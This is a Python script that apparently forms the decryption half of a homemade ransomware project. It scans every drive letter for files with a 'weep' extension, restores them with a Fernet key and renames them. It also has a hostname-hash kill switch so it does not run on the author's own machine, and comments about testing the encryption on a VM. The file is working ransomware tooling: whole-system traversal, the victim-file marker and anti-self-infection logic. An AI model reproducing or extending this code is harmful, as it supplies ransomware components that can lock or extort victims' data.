#catch error keyfile doesn't exist
#catch error permission denied
#ใส่เบรกว่า ถ้าชื่อเครื่องเป็นเรา ไม่รัน
import os, subprocess, time, hashlib
from cryptography.fernet import Fernet
class decrypt(object):
    """
    docstring
    """
    def __init__(self):
        with open('keyfile.txt','rb')as f:
            self.key = f.read()
        self.cryptor = Fernet(self.key)

    @staticmethod
    def generatedirlist():
        """
        generate a to z and call findext every loop from a to z
        using drives parameter
        """
        for i in range(65,65+26):
            yield chr(i)+":\\"

    def decrypt(self,data):
        return self.cryptor.decrypt(data)
    
    def path_traversal(self):
        path = self.generatedirlist()
        for item in path:
            for root, _, files in os.walk(item):            #change item to '.' for test
                for name in files:
                    yield(os.path.join(root,name))
        
    def run(self):
        for file in self.path_traversal():
            if not file.endswith('weep'):
                continue
            try:
                file_stat = os.stat(file)
                if os.path.exists('filesize.txt'):
                        filesizemode ='a'
                else:
                    filesizemode ='w'
                with open('filesize.txt',filesizemode) as f:
                    f.write(str(file_stat.st_size)+'\n')

                with open(file,"rb+") as f:
                    data = f.read()
                    f.seek(0)
                    f.truncate()
                    f.write(self.decrypt(data))
                os.rename(file,file[:-5])
            except Exception as exception:
                with open('errorslogdecrypt.txt','a',encoding='utf-8')as f:
                    f.write(str(exception))
                    f.write('\n')
               
    @staticmethod
    def EmergencyBreak():
        cmd ='hostname'
        p = subprocess.run(cmd,shell=True,encoding='utf-8',capture_output=True)
        return p.stdout[:-1]

            
if __name__ == "__main__":
    hash = hashlib.md5(decrypt.EmergencyBreak().encode('utf-8')).hexdigest()
    try:
        localtime = time.asctime( time.localtime(time.time()) )
        with open('errorslogdecrypt.txt','w',encoding='utf-8') as f:
            f.write(str(localtime))
            f.write('\n')

        if hash =='8abe12940cc6d19c7984cbe78ebe6213':#break on my machine                             #Comment this line for test  #am sick of encrypting my own file, let's just test on VM although it is incredibly slow olo
            exit()
        test = decrypt()
        test.run()

        localtime2 = time.asctime(time.localtime(time.time()))
        
        with open('errorfile.txt','a',encoding='utf-8') as f:
            f.write(str(localtime2))
            f.write('\n')
            
    except Exception as exception:
        with open('errorslogdecrypt.txt','a',encoding='utf-8')as f:
            f.write(str(exception))
            f.write('\n')
